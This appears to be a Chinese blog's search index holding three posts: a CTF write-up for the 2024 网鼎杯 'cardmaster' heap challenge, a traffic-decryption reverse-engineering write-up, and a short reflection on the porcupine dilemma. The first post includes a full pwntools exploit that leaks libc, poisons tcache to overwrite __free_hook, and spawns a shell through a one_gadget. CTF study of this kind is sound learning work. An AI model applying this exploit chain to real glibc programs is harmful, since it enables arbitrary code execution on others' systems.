<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>网鼎杯2024——cardmaster</title>
      <link href="/2024/11/29/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E2%80%94%E2%80%94cardmaster/"/>
      <url>/2024/11/29/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E2%80%94%E2%80%94cardmaster/</url>
      
        <content type="html"><![CDATA[<h2 id="cardmaster"><a href="#cardmaster" class="headerlink" title="cardmaster"></a>cardmaster</h2><h3 id="换ld和libc"><a href="#换ld和libc" class="headerlink" title="换ld和libc"></a>换ld和libc</h3><p>此步骤略，但是可以发现是2.27的版本</p><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>经过分析得到结构体</p><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce1067c29.png" alt="image-20241129114856377" title="1"></p><p>函数的功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;   CARD MASTER&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  1. init card set&quot;</span>); <span class="comment">//利用点</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  2. set info&quot;</span>);<span class="comment">//利用点</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  3. get info&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;  4. shuffle!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;  5. show cards&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce10ae6d8.png" alt="image-20241129115329714"></p><p>利用realloc在申请为0时会执行free策略，来进行释放，并且可以double</p><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce10239f7.png" alt="image-20241129115811070"></p><p>show这里没有对堆块进行检查，可以直接打印，有点uaf的感觉</p><h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><h4 id="泄露libc基址"><a href="#泄露libc基址" class="headerlink" title="泄露libc基址"></a>泄露libc基址</h4><p>第一步利用set_info创建一个0x110的大堆块，然后释放掉得到unsort</p><p>这时候还会存在一个tacache bin，然后用init来吧tacache bin清空</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0x110</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">init()</span><br></pre></td></tr></table></figure><p>再次free，由于这时花色是全局变量，所以这里执行malloc0，但是malloc最小为0x20，于是从unsortbin切割，由于init中的malloc已经进行一次切割，所以得到的数据在free新申请的数据里存在，并且位置正好在字符串处，打印获得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">free()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;set:&quot;</span>)</span><br><span class="line">base = u64(p.recvuntil(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br></pre></td></tr></table></figure><h4 id="二次释放"><a href="#二次释放" class="headerlink" title="二次释放"></a>二次释放</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libc.address = base</span><br><span class="line">one_gadget = <span class="number">0x4f322</span> + base</span><br><span class="line">free()</span><br><span class="line">free()</span><br></pre></td></tr></table></figure><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce0fbb164.png" alt="image-20241129121619304"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">4</span>,p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br></pre></td></tr></table></figure><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce0fdcebc.png" alt="image-20241129121845198"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">init()<span class="comment">#init是为了让花色初始化，好进行下一次malloc</span></span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>))<span class="comment">#第一次申请，将_free_hook地址转移到可写的堆块上</span></span><br><span class="line"></span><br><span class="line">init()</span><br><span class="line">edit(<span class="number">4</span>,p64(one_gadget)) <span class="comment"># free函数劫持</span></span><br></pre></td></tr></table></figure><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce1020bf4.png" alt="image-20241129122442573"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#执行</span></span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>完整expoit</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;cardmaster&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;nt:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;l:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1000&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">count,cnt</span>):</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(count))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;13&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1000&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;:&#x27;</span>)</span><br><span class="line">    p.sendline(cnt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x110</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">init()</span><br><span class="line">free()</span><br><span class="line">pause()</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;set:&quot;</span>)</span><br><span class="line">base = u64(p.recvuntil(<span class="string">&quot;:&quot;</span>)[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libc.address = base</span><br><span class="line">one_gadget = <span class="number">0x4f322</span> + base</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">edit(<span class="number">4</span>,p64(libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">init()</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>))</span><br><span class="line">init()</span><br><span class="line">edit(<span class="number">4</span>,p64(one_gadget))</span><br><span class="line">free()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://www.helloimg.com/i/2024/11/29/6749ce1018bcc.png" alt="image-20241129123219218"></p><p>拿到shell</p>]]></content>
      
      
      <categories>
          
          <category> 赛后复盘 </category>
          
          <category> 网鼎杯2024 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2024半决赛数据逆向</title>
      <link href="/2024/11/24/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%95%B0%E6%8D%AE%E9%80%86%E5%90%91/"/>
      <url>/2024/11/24/%E7%BD%91%E9%BC%8E%E6%9D%AF2024%E5%8D%8A%E5%86%B3%E8%B5%9B%E6%95%B0%E6%8D%AE%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h2 id="数据逆向"><a href="#数据逆向" class="headerlink" title="数据逆向"></a>数据逆向</h2><p>本题是考察流量和逆向的共同分析，开始给了三个附件</p><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe7191ff.png" alt="image-20241124215855987.png" title="1"></p><p>查看后分别可以明白这三个文件的作用</p><ul><li>traffic.pcap :流量包，经过下面两个软件通信得到的流量</li><li>ser：server服务器端，elf文件</li><li>cli：客户端，elf文件</li></ul><h3 id="主要逻辑"><a href="#主要逻辑" class="headerlink" title="主要逻辑"></a>主要逻辑</h3><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe89e2c8.png" alt="image-20241124220512861.png" title="2"></p><h3 id="sub-1825"><a href="#sub-1825" class="headerlink" title="sub_1825"></a>sub_1825</h3><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe7ea9f4.png" alt="image-20241124220824963.png" title="3"></p><h3 id="sub-1552"><a href="#sub-1552" class="headerlink" title="sub_1552"></a>sub_1552</h3><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe8351d3.png" alt="image-20241124221146889.png" title="4"></p><p>只看server的话，我们就应该去看流量包，找到发出一个key并返回right的流量，之后发送token</p><h3 id="traffic-pcap"><a href="#traffic-pcap" class="headerlink" title="traffic.pcap"></a>traffic.pcap</h3><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe908f71.png" alt="image-20241124221607754.png" title="4"></p><p>跟踪到这段流量，但是会发现只有key正确但是没有正确的请求返回解密的包，所以我们需要自己使用它的key来给流量解密</p><p><strong>PS：</strong> 密码的wireshark！！为什么要在这加空格！！？？？加空格也就罢了，你还能复制上！！！！！因为空格浪费了近一小时（）</p><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe74b419.png" alt="image-20241124221857096.png" title="5"></p><h3 id="解密脚本（注意端序）"><a href="#解密脚本（注意端序）" class="headerlink" title="解密脚本（注意端序）"></a>解密脚本（注意端序）</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">char</span> message[] = &#123; <span class="number">0xD1</span>,<span class="number">0x37</span>,<span class="number">0xd9</span>,<span class="number">0x5b</span>,<span class="number">0xf0</span>,<span class="number">0xA2</span>,<span class="number">0x32</span>,<span class="number">0xC6</span>,<span class="number">0x30</span>,<span class="number">0xA7</span>,<span class="number">0x8C</span>,<span class="number">0x50</span>,<span class="number">0x7E</span>,<span class="number">0x3E</span>,<span class="number">0xA7</span>,<span class="number">0x3A</span>,<span class="number">0xBA</span>,<span class="number">0xC0</span>,<span class="number">0x58</span>,<span class="number">0x6b</span>,<span class="number">0x81</span>,<span class="number">0x85</span>,<span class="number">0x6b</span>,<span class="number">0x1c</span>,</span><br><span class="line"><span class="number">0x4c</span>,<span class="number">0xf5</span>,<span class="number">0x80</span>,<span class="number">0x7c</span>,<span class="number">0x8a</span>,<span class="number">0xC1</span>,<span class="number">0x42</span>,<span class="number">0x97</span>,<span class="number">0x90</span>,<span class="number">0xc7</span>&#125;;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">264</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">char</span> v3 = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> v7 = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> v11 = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> v6 = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> v10 = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> v12 = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">encryption</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* buf,<span class="type">char</span>* message,<span class="type">int</span> length)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xFF</span>; ++i)</span><br><span class="line">v14[i] = i;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">0xFF</span>; ++j) &#123;</span><br><span class="line">v3 = v14[j] + v11;</span><br><span class="line">v11 = (<span class="type">unsigned</span> __int8)(v3 + buf[j % <span class="built_in">strlen</span>(buf)]);</span><br><span class="line">v6 = v14[j];</span><br><span class="line">v14[j] = v14[v11];</span><br><span class="line">v14[v11] = v6;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; length; ++k) &#123;</span><br><span class="line">v10 = (<span class="type">unsigned</span> __int8)(v10 + <span class="number">1</span>);</span><br><span class="line">v12 = (<span class="type">unsigned</span> __int8)(v14[v10] + v12);</span><br><span class="line">v7 = v14[v10];</span><br><span class="line">v14[v10] = v14[v12];</span><br><span class="line">v14[v12] = v7;</span><br><span class="line">*(<span class="type">char</span>*)(message + k) ^= v14[(<span class="type">unsigned</span> __int8)(v14[v10] + v14[v12])] ^<span class="number">0x25</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">encryption</span>(<span class="string">&quot;WangDingCUPKEY!!&quot;</span>, message, <span class="number">0x22</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">34</span>; ++i) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, message[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cli"><a href="#cli" class="headerlink" title="cli"></a>cli</h3><p><img src="https://www.helloimg.com/i/2024/11/29/6749cbe897250.png" alt="image-20241124222440602.png" title="6"></p><h2 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h2><p>直接在本地里启动服务，然后把keyword发送一下，然后就可以看到flag回显过来了……</p>]]></content>
      
      
      <categories>
          
          <category> 赛后复盘 </category>
          
          <category> 网鼎杯2024 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>A-T-Field-豪猪两难</title>
      <link href="/2024/07/04/A-T-Field-%E8%B1%AA%E7%8C%AA%E4%B8%A4%E9%9A%BE/"/>
      <url>/2024/07/04/A-T-Field-%E8%B1%AA%E7%8C%AA%E4%B8%A4%E9%9A%BE/</url>
      
        <content type="html"><![CDATA[<p><img src="https://www.helloimg.com/i/2024/11/29/6749ce102d95b.png" alt="2.png" title="1043"></p><p>豪猪的身上有刺，当<strong>豪猪想要靠近为他人提供暖的时候身上的刺却又会不情愿的刺到对方</strong>。 套用在人身上，似乎也是如此。所谓成为大人,就是在反复的接近和远离中找到互不伤害对方的距离。</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内心 </tag>
            
            <tag> 哲学 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
